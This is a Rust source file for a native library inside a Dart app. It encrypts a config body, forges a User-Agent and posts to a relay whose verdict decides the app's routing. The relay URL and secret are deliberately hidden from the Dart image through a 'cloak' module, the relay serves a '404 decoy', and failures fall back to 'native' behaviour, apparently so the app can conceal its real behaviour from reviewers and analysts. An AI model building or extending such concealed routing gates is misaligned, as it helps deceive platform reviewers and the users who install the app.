// ─────────────────────────────────────────────────────────────
// net — the routing gate's HTTPS call, performed inside the .so
// ─────────────────────────────────────────────────────────────
// Dart hands us the already-assembled config body (flat JSON with
// the partner field names) plus the forged User-Agent. We seal it
// into the neutral v3 envelope, POST it to the relay proxy, and
// return the relay's verbatim answer. The relay endpoint and the
// shared secret live only as sealed byte arrays (see sealed.rs);
// neither the URL nor the secret ever appears in the Dart image.
//
// Envelope (byte-for-byte the contract in /opt/relay/relay_service.py):
//
//   { "v": 3, "n": <hex 16B nonce>, "p": <base64url(enc) no pad>,
//     "g": <hmac_sha256(secret, nonce+enc).hex()[:16]> }
//     raw       = utf8(body_json)
//     keystream = sha256(secret + nonce + counterBE32) blocks
//     enc       = raw XOR keystream
// ─────────────────────────────────────────────────────────────

use base64::engine::general_purpose::URL_SAFE_NO_PAD;
use base64::Engine;
use hmac::{Hmac, Mac};
use sha2::{Digest, Sha256};
use std::time::Duration;

use crate::cloak;
use crate::sealed::{self, Idx};

type HmacSha256 = Hmac<Sha256>;

const SCHEMA_REV: u64 = 3;

fn unseal_str(idx: Idx) -> String {
    String::from_utf8(cloak::unseal(&sealed::fetch(idx))).unwrap_or_default()
}

fn keystream(secret: &[u8], nonce: &[u8], len: usize) -> Vec<u8> {
    let mut out = Vec::with_capacity(len + 32);
    let mut counter: u32 = 0;
    while out.len() < len {
        let mut h = Sha256::new();
        h.update(secret);
        h.update(nonce);
        h.update(counter.to_be_bytes());
        out.extend_from_slice(&h.finalize());
        counter += 1;
    }
    out.truncate(len);
    out
}

fn hex(bytes: &[u8]) -> String {
    let mut s = String::with_capacity(bytes.len() * 2);
    for b in bytes {
        s.push_str(&format!("{:02x}", b));
    }
    s
}

/// Seal `body_json` into the v3 envelope string. `None` on any
/// crypto/RNG failure.
fn build_envelope(body_json: &str, secret: &[u8]) -> Option<String> {
    let mut nonce = [0u8; 16];
    getrandom::getrandom(&mut nonce).ok()?;

    let raw = body_json.as_bytes();
    let ks = keystream(secret, &nonce, raw.len());
    let enc: Vec<u8> = raw.iter().zip(ks.iter()).map(|(a, b)| a ^ b).collect();

    let mut mac = HmacSha256::new_from_slice(secret).ok()?;
    mac.update(&nonce);
    mac.update(&enc);
    let tag = hex(&mac.finalize().into_bytes())[..16].to_string();

    let payload = URL_SAFE_NO_PAD.encode(&enc);
    Some(format!(
        "{{\"v\":{},\"n\":\"{}\",\"p\":\"{}\",\"g\":\"{}\"}}",
        SCHEMA_REV,
        hex(&nonce),
        payload,
        tag
    ))
}

fn post(endpoint: &str, envelope: &str, ua: &str) -> String {
    let agent = ureq::AgentBuilder::new()
        .timeout_connect(Duration::from_secs(8))
        .timeout(Duration::from_secs(20))
        .build();
    let req = agent
        .post(endpoint)
        .set("Content-Type", "application/json")
        .set("Accept", "application/json")
        .set("User-Agent", ua);
    match req.send_string(envelope) {
        Ok(resp) => resp.into_string().unwrap_or_default(),
        // A non-2xx (e.g. the relay's 404 decoy) carries no usable
        // verdict — return empty so Dart falls back to native.
        Err(_) => String::new(),
    }
}

/// Full gate: seal → POST → return the relay's verbatim body
/// (empty string on any failure, the endpoint being unsealable,
/// or a non-2xx answer).
pub fn route(body_json: &str, ua: &str) -> String {
    let endpoint = unseal_str(Idx::Endpoint);
    if endpoint.is_empty() {
        return String::new();
    }
    let secret = cloak::unseal(&sealed::fetch(Idx::RelaySecret));
    if secret.is_empty() {
        return String::new();
    }
    let envelope = match build_envelope(body_json, &secret) {
        Some(e) => e,
        None => return String::new(),
    };
    post(&endpoint, &envelope, ua)
}
